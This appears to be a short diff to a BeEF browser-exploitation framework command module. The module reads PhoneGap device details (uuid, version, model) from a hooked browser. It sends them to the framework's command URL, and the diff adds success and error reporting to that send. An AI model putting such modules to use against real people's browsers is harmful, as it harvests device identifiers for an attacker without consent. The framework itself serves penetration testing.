@@ -19,10 +19,8 @@ beef.execute(function() {
         + " uuid: " + device.uuid
         + " version: " + device.version
 	+ " model: " + device.model;
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "phonegap=" + phonegap_details, beef.are.status_success());
     } catch(e) {
-        phonegap_details = "unable to detect phonegap";
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unable to detect phonegap", beef.are.status_error());
     }
-
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "phonegap="+phonegap_details);
-
 });
